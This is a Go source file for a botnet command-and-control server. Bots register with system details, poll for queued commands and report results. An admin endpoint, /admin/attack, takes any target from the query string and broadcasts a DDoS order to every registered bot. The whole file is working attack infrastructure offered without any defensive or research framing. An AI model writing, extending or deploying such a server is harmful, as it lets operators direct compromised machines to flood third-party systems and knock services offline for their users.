package main

import (
	"encoding/json"
	"fmt"
	"github.com/google/uuid"
	"log"
	"net/http"
	"sync"
	"time"
)

type BotInfo struct {
	ID       string `json:"id"`
	OS       string `json:"os"`
	Hostname string `json:"hostname"`
	CPUCores int    `json:"cpu_cores"`
	Status   string `json:"status"`
	LastSeen time.Time
}

type BotCommand struct {
	CommandID string      `json:"command_id"`
	Command   interface{} `json:"command"`
}

type CommandResult struct {
	BotID  string `json:"bot_id"`
	Result string `json:"result"`
}

var (
	bots        = make(map[string]BotInfo)
	pendingCmds = make(map[string][]BotCommand)
	mu          sync.RWMutex
)

func handleRegister(w http.ResponseWriter, r *http.Request) {
	var bot BotInfo
	if err := json.NewDecoder(r.Body).Decode(&bot); err != nil {
		return
	}
	bot.LastSeen = time.Now()
	mu.Lock()
	bots[bot.ID] = bot
	mu.Unlock()
	log.Printf("🤖 [LINK] Bot Connected: %s (%s)", bot.ID, bot.OS)
}

func handleFetchCommands(w http.ResponseWriter, r *http.Request) {
	botID := r.URL.Path[len("/commands/"):]
	mu.Lock()
	defer mu.Unlock()

	cmds := pendingCmds[botID]
	if len(cmds) > 0 {
		json.NewEncoder(w).Encode(cmds)
		pendingCmds[botID] = []BotCommand{}
		log.Printf("📡 [CMD] Sent tasks to %s", botID)
	} else {
		json.NewEncoder(w).Encode([]BotCommand{})
	}
}

func handleResult(w http.ResponseWriter, r *http.Request) {
	var res CommandResult
	json.NewDecoder(r.Body).Decode(&res)
	log.Printf("📝 [REPORT %s]: %s", res.BotID, res.Result)
}

func handleAdminAttack(w http.ResponseWriter, r *http.Request) {
	target := r.URL.Query().Get("target")
	payload := map[string]interface{}{
		"DDoS": map[string]interface{}{"target": target, "duration": 10},
	}
	broadcastCommand(payload)
	fmt.Fprintf(w, "ATTACK LAUNCHED ON %s", target)
}

func broadcastCommand(payload interface{}) {
	mu.Lock()
	defer mu.Unlock()
	cmd := BotCommand{CommandID: uuid.New().String(), Command: payload}
	for id := range bots {
		pendingCmds[id] = append(pendingCmds[id], cmd)
	}
}

func main() {
	http.HandleFunc("/register", handleRegister)
	http.HandleFunc("/commands/", handleFetchCommands)
	http.HandleFunc("/result", handleResult)
	http.HandleFunc("/admin/attack", handleAdminAttack)

	log.Println("🔥 COMMANDER READY ON :8080")
	http.ListenAndServe(":8080", nil)
}
